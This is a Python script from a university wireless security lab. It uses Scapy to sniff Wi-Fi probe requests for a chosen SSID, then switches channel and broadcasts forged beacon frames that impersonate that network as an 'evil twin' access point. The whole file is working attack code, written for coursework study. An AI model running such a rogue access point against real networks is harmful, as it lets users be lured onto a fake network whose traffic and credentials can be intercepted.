#  -*- coding: utf-8 -*-

# SWI - Labo2-MAC2
# Date: 09.03.2020
# File: probeRequest_evilTwin.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# Sources: - IEEE Std 802.11-2016
#          - https://gist.github.com/securitytube/5291959
#		   - https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
#          - https://www.thepythoncode.com/article/create-fake-access-points-scapy

from scapy.all import *

# We check if the user provided the required numbers of arguments
if len(sys.argv) != 3:
    print("usage : station-detection.py <interface> <target ssid>")
    exit()

interface = sys.argv[1]
ssid = sys.argv[2].encode()

apMAC = '1a:b2:3c:d4:5e:f6' # Use RandMAC() to have random MAC for each packet

# Handle captured packet
# pkt: captured packet
def PacketHandler(pkt):
    if pkt.haslayer(Dot11):
        # We check if it is a probe frame
        if pkt.type==0 and pkt.subtype==4:
            print("Scanning for SSID")
            print("AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info))

            if bytes(ssid) == pkt.info:
                print("SSID found!\nAP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info))
                evilTwin(pkt[RadioTap].Channel)

def evilTwin(channel):
    # We define the channel for the beacon
    if(channel % 14 > 7):
        new_ch = (channel - 6) % 14 + 1
    else:
        new_ch = (channel + 6) % 14 + 1
    
    print("\nProbe channel: " + str(channel % 14))
    print("Beacon Channel " + str(new_ch))

    os.system(f"iwconfig {interface} channel {new_ch}")

    # We forge a beacon frame
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=apMAC, addr3=apMAC)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID="SSID",info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'                 #RSN Version 1
    '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'         #AES Cipher
    '\x00\x0f\xac\x02'         #TKIP Cipher
    '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'         #Pre-Shared Key
    '\x00\x00'))               #RSN Capabilities (no extra capabilities)

    frame = RadioTap()/dot11/beacon/essid/rsn

    print("\n")
    frame.show()

    input("\nPress enter to start\n")
    print("To stop hit CTRL+C")

    sendp(frame, iface=interface, inter=0.100, loop=2)
    # To exit script once sendp has finished instead of going back to sniffing
    exit()

print("Scanning for SSID")
sniff(iface=interface, prn = PacketHandler, store=0)